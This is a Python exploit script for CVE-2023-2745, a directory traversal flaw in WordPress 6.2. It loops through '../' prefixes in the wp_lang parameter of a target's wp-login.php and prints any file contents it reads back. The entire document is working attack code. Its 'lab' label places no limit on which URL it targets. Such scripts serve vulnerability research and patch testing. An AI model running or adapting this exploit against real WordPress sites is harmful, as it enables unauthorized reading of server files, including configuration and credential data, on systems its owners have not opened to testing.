# Exploit Title: WordPress Core 6.2 - Directory Traversal
# Version: = 6.2
# CVE : CVE-2023-2745
# Author: VeryLazyTech
# Medium https://medium.com/@verylazytech
# URI: https://www.verylazytech.com

import requests
from colorama import init, Fore, Style
import argparse

init(autoreset=True)

# Argument parser
parser = argparse.ArgumentParser(description="Simulate CVE-2023-2745 LFI exploit in a lab.")
parser.add_argument("url", help="Target wp-login.php URL, e.g., http://localhost/wp-login.php")
parser.add_argument("file", help="File to read via wp_lang parameter, e.g., lab-file.txt")
args = parser.parse_args()

# Ensure URL has http or https
url = args.url
if not url.startswith(("http://", "https://")):
    url = "http://" + url

# List of traversal prefixes to try
traversals = [
    "../../../../../../../../../../../../",
    "../../../../../../../../../../../",
    "../../../../../../../../../../",
    "../../../../../../../../../",
    "../../../../../../../../",
    "../../../../../../../",
    "../../../../../../",
    "../../../../../",
    "../../../../",
    "../../../",
    "../../",
    "../",
    "/",
]

found = False

for t in traversals:
    # Try root traversal
    payload = t + args.file
    response = requests.get(url, params={'wp_lang': payload})
    if response.status_code == 200 and response.text.strip() and "File not found" not in response.text and "access denied" not in response.text.lower():
        print(Fore.GREEN + f'File found with traversal: {t}')
        print(Fore.GREEN + response.text)
        found = True
        break

if not found:
    print(Fore.YELLOW + "File not found with the given traversals and subdirectories.")


